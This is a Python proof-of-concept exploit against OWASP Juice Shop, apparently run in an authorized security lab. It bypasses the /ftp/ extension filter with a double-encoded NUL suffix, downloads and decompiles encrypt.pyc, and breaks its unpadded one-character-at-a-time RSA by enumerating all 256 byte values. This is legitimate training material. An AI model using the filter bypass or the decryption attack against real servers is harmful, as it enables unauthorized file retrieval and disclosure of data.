#!/usr/bin/env python3
"""
PoC 5 - encrypt.pyc: retrieval, decompilation and crypto break
Target: OWASP Juice Shop (http://host.docker.internal:3000)  [authorized lab]

Chain:
  1. /ftp/ blocks .pyc by extension string-match, bypassed with the
     double-encoded NUL + allowed suffix:  encrypt.pyc%2500.md  -> 200 OK
  2. Bytecode is CPython 2.7 (magic 0x03f3 0d0a) -> decompile with uncompyle6,
     cross-check with xdis disassembly.
  3. The script's "encryption" is textbook RSA, e=65537, NO padding, applied
     to ONE character at a time and written as one decimal integer per line:
         c = ord(char) ** e mod N
     Consequences:
       * The plaintext space is only 256 symbols -> the whole keyspace can be
         enumerated, so factorization is never needed (dictionary attack).
       * Even without that, small-message / no-padding RSA is trivially broken
         (and each character is independently recoverable => frequency analysis).

Usage: python3 poc5_pyc_reverse.py
Outputs: /workspace/loot/{encrypt.pyc,encrypt_decompiled.py,encrypt_disasm.txt,
         announcement_encrypted.md,announcement_decrypted.md}
"""
import os
import re
import subprocess
import sys
import urllib.parse

import requests

BASE = "http://host.docker.internal:3000"
BYPASS = "%2500.md"                 # double-encoded NUL + allowed extension
LOOT = "/workspace/loot"
PYC = f"{LOOT}/encrypt.pyc"
CT_FILE = f"{LOOT}/announcement_encrypted.md"
DECOMP = f"{LOOT}/encrypt_decompiled.py"
DISASM = f"{LOOT}/encrypt_disasm.txt"
PLAINTEXT = f"{LOOT}/announcement_decrypted.md"

os.makedirs(LOOT, exist_ok=True)


def step(msg):
    print(f"[*] {msg}")


def fetch(name, dest):
    """Fetch a /ftp/ file using the NUL-truncation extension bypass."""
    url = f"{BASE}/ftp/{name}{BYPASS}"
    r = requests.get(url, timeout=30)
    print(f"    GET /ftp/{name}{BYPASS} -> HTTP {r.status_code} ({len(r.content)} B)")
    if r.status_code != 200 or not r.content:
        raise RuntimeError(f"could not retrieve {name}")
    with open(dest, "wb") as fh:
        fh.write(r.content)
    return r.content


def main():
    step("1. Retrieve encrypt.pyc through the /ftp/ extension filter")
    blocked = requests.get(f"{BASE}/ftp/encrypt.pyc", timeout=15)
    print(f"    GET /ftp/encrypt.pyc -> HTTP {blocked.status_code} (blocked)")
    data = fetch("encrypt.pyc", PYC)

    magic = data[:4]
    ver = int.from_bytes(magic[:2], "little")   # 2.7 pyc header: magic, mtime, size
    pyver = {62211: "2.7", 3413: "3.8"}.get(ver, "unknown")
    import struct
    mtime, srcsize = struct.unpack("<II", data[4:12])
    print(f"    magic={magic.hex()} (ver=0x{ver:04x}) -> CPython {pyver} bytecode,"
          f" source-size field={srcsize}, {len(data)} bytes on disk")
    print(f"    header mtime field={mtime} (0 == wiped; real ts is 1590007586 in code obj)")

    step("2. Decompile (uncompyle6) and disassemble (xdis) for cross-checking")
    with open(DECOMP, "w") as fh:
        rc = subprocess.run(["uncompyle6", PYC], stdout=fh,
                            stderr=subprocess.PIPE)
    if rc.returncode != 0:
        print("    uncompyle6 failed, falling back to disassembly only")
    src = open(DECOMP).read() if os.path.getsize(DECOMP) else ""
    with open(DISASM, "w") as fh:
        subprocess.run(["pydisasm", PYC], stdout=fh, stderr=subprocess.DEVNULL,
                       check=False)
    print(f"    source -> {DECOMP}  disasm -> {DISASM}")
    print("    --- decompiled body ---")
    for line in src.splitlines():
        print("    " + line)
    print("    -----------------------")

    m = re.search(r"^N\s*=\s*(\d+)L?", src, re.M)
    me = re.search(r"^e\s*=\s*(\d+)", src, re.M)
    if not m or not me:
        raise RuntimeError("could not extract N/e from decompiled source")
    N, e = int(m.group(1)), int(me.group(1))
    print(f"    extracted N ({N.bit_length()} bit), e={e}")

    step("3. Verify the algorithm reproduces the published ciphertext")
    pt_probe = "Major Announcement"
    local = [pow(ord(c), e, N) for c in pt_probe]
    fetch("announcement_encrypted.md", CT_FILE)
    ct = [int(x) for x in open(CT_FILE).read().split()]
    print(f"    ciphertext entries={len(ct)} unique={len(set(ct))}")
    assert ct[:len(local)] == local, "algorithm does not match file -> wrong parse"
    print("    first line matches ord('M')**e mod N -> algorithm confirmed")

    step("4. Break it: no padding + 1-char blocks => keyspace is only 256 values")
    table = {pow(c, e, N): c for c in range(256)}
    missing = [c for c in ct if c not in table]
    print(f"    enumerated 256 candidate symbols; unmapped ciphertexts={len(missing)}")
    if missing:
        raise RuntimeError("some ciphertexts unmapped (non-byte alphabet?)")
    plaintext = "".join(chr(table[c]) for c in ct)
    with open(PLAINTEXT, "w") as fh:
        fh.write(plaintext)

    step("5. Integrity check: re-encrypting the recovered text must match byte-for-byte")
    reenc = [pow(ord(c), e, N) for c in plaintext]
    print(f"    re-encrypt identical to file: {reenc == ct}")

    print(f"\n[+] VULNERABLE: encrypt.pyc retrieved, decompiled and its "
          f"'encryption' broken without factoring N.")
    print(f"    N bits = {N.bit_length()} (public modulus, never needed)")
    print(f"    recovered {len(plaintext)} chars -> {PLAINTEXT}")
    print("\n    --- first 400 chars of recovered plaintext ---")
    print("    " + plaintext[:400].replace("\n", "\n    "))
    return 0


if __name__ == "__main__":
    sys.exit(main())
